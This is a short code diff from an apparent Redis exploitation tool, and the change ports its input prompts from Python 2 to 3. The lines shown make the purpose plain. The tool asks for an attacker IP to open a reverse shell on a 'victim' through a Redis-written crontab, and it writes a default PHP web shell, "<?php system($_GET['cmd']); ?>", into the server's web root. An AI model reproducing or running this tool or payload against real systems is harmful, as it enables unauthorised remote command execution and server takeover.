@@ -2,8 +2,8 @@ import urllib
 
 def Redis():
     def get_Redis_ReverseShell():
-        server = raw_input("\033[96m" +"\nGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): "+ "\033[0m")
-        crontab_dir = raw_input("\033[96m" +"What can be his Crontab Directory location\n## For debugging(locally) you can use /var/lib/redis : "+ "\033[0m")
+        server = input("\033[96m" +"\nGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): "+ "\033[0m")
+        crontab_dir = input("\033[96m" +"What can be his Crontab Directory location\n## For debugging(locally) you can use /var/lib/redis : "+ "\033[0m")
         if(not server):
             server = "127.0.0.1"
         if(not crontab_dir):
@@ -57,8 +57,8 @@ save\r
 
 
     def get_Redis_PHPShell():
-        web_root_location = raw_input("\033[96m" +"\nGive web root location of server (default is /var/www/html): "+ "\033[0m")
-        php_payload = raw_input("\033[96m" +"Give PHP Payload (We have default PHP Shell): "+ "\033[0m")
+        web_root_location = input("\033[96m" +"\nGive web root location of server (default is /var/www/html): "+ "\033[0m")
+        php_payload = input("\033[96m" +"Give PHP Payload (We have default PHP Shell): "+ "\033[0m")
         default = "<?php system($_GET['cmd']); ?>"
         if(not php_payload):
             php_payload = default
@@ -109,7 +109,7 @@ save\r
 
 
     print("\033[01m"+"\nReady To get SHELL\n"+ "\033[0m")
-    what = raw_input("\033[35m" +"What do you want?? (ReverseShell/PHPShell): "+ "\033[0m")
+    what = input("\033[35m" +"What do you want?? (ReverseShell/PHPShell): "+ "\033[0m")
     what = what.lower()
     if("rev" in what):
         get_Redis_ReverseShell()
